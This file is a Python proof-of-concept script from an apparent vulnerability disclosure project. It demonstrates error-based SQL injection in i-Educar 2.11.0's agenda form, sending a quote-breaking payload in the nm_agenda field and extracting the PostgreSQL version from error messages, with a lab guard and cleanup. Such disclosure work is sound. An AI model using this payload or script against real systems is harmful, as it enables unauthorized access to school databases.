#!/usr/bin/env python3
"""VULN 09 — error-based SQL injection in agenda_admin_cad.php.

`Novo()` builds an INSERT with `'{$this->nm_agenda}'` directly inside the
quoted string, and `Editar()` does the same for the UPDATE. A single quote in
`nm_agenda` breaks out of the string; the PoC injects
`CAST((SELECT version()) AS INT)`, which makes PostgreSQL fail with the server
version inside the error message returned by the application.

The PoC only reads the version through the error channel and does not persist
data: the injected INSERT aborts on the error. A benign control request is
created and removed again.
"""

from __future__ import annotations

import html
import re
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli
from lib import lab as lab_mod  # noqa: E402

VULN = {
    "id": "09",
    "slug": "agenda-sql-injection",
    "title": "Error-based SQL injection in agenda_admin_cad.php (nm_agenda)",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-89",
    "cwe_name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/89.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "User input is concatenated inside a quoted SQL string and executed, which is the "
        "classic CWE-89. CWE-564 concerns Hibernate-specific injection (not used here); "
        "CWE-943 covers NoSQL injection and CWE-74 is the abstract injection parent."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cvss_score": 8.8,
    "endpoint": "POST /intranet/agenda_admin_cad.php",
    "params": ["nm_agenda", "tipoacao"],
    "precondition": "login (any profile with access to the agenda form; verified with admin)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/09-agenda-sql-injection-01-version-leak.png",
    ],
    "advisory_url": "https://github.com/pollotherunner/i-explorar/blob/main/vulns/09-agenda-sql-injection/README.md",
}

ADMIN = credentials.credentials("admin")
PAYLOAD = "teste' || CAST((SELECT version()) AS INT) || '"
BENIGN = "i_explorar_poc09_benign"
CLEANUP_SQL = (
    "DELETE FROM portal.agenda_responsavel WHERE ref_cod_agenda IN (SELECT cod_agenda FROM portal.agenda WHERE nm_agenda = '%s'); "
    "DELETE FROM portal.agenda WHERE nm_agenda = '%s';" % (BENIGN, BENIGN)
)


def _compose(lab: Path, *args: str) -> list[str]:
    return lab_mod.compose(lab, *args)


def _psql(lab: Path, sql: str, *, log: evidence.EvidenceLog) -> str:
    cmd = _compose(lab, "exec", "-T", "postgres", "psql", "-U", "ieducar", "-d", "ieducar", "-tAc", sql)
    log.command(" ".join(cmd))
    proc = subprocess.run(cmd, cwd=lab, capture_output=True, text=True, timeout=120)
    output = (proc.stdout + proc.stderr).strip()
    log.block("psql output", output or "(empty)")
    return output


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    lab = lab_mod.lab_dir()
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")

    client = http_util.HttpClient(target, verbose=verbose)
    client.login(*ADMIN)
    if not client.logged_in():
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "admin login failed"}

    error_lines: list[str] = []
    try:
        benign = client.post(
            "/intranet/agenda_admin_cad.php",
            data={"tipoacao": "Novo", "nm_agenda": BENIGN},
        )
        log.write("")
        log.write("### control: POST tipoacao=Novo nm_agenda=" + BENIGN)
        log.write(f"HTTP {benign.status} location={benign.location}")

        injected = client.post(
            "/intranet/agenda_admin_cad.php",
            data={"tipoacao": "Novo", "nm_agenda": PAYLOAD},
        )
        log.write("")
        log.write("### injection: POST tipoacao=Novo nm_agenda=" + PAYLOAD)
        log.write(f"HTTP {injected.status} content-length={len(injected.body)}")
        for line in injected.text.splitlines():
            if "ERROR:" in line or "invalid input syntax" in line:
                cleaned = html.unescape(re.sub(r"<[^>]+>", " ", line)).strip()
                cleaned = re.sub(r"\s+", " ", cleaned)[:300]
                if cleaned and cleaned not in error_lines:
                    error_lines.append(cleaned)
        log.block("extracted PostgreSQL error lines", "\n".join(error_lines) or "(none)")
        vulnerable = any("invalid input syntax" in line for line in error_lines) and any(
            "PostgreSQL" in line for line in error_lines
        )
        version = ""
        for line in error_lines:
            found = re.search(r"PostgreSQL \d+(?:\.\d+)?", line)
            if found:
                version = found.group(0)
                break
        if vulnerable:
            notes.append(f"database version leaked through the error channel: {version or 'PostgreSQL'}")
        else:
            notes.append("no error returned for the injected quote")
    finally:
        _psql(lab, CLEANUP_SQL, log=log)
        log.close()

    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
